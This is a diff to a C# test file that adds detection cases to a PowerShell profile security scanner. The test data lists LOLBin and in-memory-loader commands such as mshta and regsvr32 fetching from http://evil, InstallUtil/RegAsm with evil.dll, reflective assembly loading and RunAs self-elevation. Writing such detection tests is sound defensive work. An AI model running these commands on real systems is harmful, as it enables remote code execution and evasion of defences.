@@ -1054,6 +1054,18 @@ public class PowerShellSecurityAnalyzerTests
     [InlineData("mshta http://evil/a.hta", "mshta")]
     [InlineData("regsvr32 /i:http://evil/a.sct scrobj", "regsvr32")]
     [InlineData("rundll32 javascript:foo", "rundll32")]
+    // LOLBin / in-memory-loader tokens added Day 59.
+    [InlineData("Add-Type -MemberDefinition $sig -Name W -Namespace N", "native-API compilation")]
+    [InlineData("Add-Type -TypeDefinition $cs -Language CSharp", "in-memory C# compilation")]
+    [InlineData("$sh = New-Object -ComObject WScript.Shell", "WScript.Shell")]
+    [InlineData("$sh.ShellExecute('calc.exe')", "ShellExecute")]
+    [InlineData("installutil /logfile= /U evil.dll", "InstallUtil")]
+    [InlineData("regasm /nologo evil.dll", "RegAsm")]
+    [InlineData("regsvcs evil.dll", "RegSvcs")]
+    [InlineData("[Reflection.Assembly]::Load($bytes)", "assembly loading")]
+    [InlineData("[AppDomain]::CurrentDomain.Load($bytes)", "AppDomain")]
+    [InlineData("Start-Process powershell -Verb RunAs -ArgumentList $a", "self-elevation")]
+    [InlineData("$p = ConvertTo-SecureString 'hunter2' -AsPlainText -Force", "credential handling")]
     public void ScanProfileContent_ModernAttackTokens_AreDetected(string content, string expectReasonSubstring)
     {
         var reasons = ScanProfileContent(content);
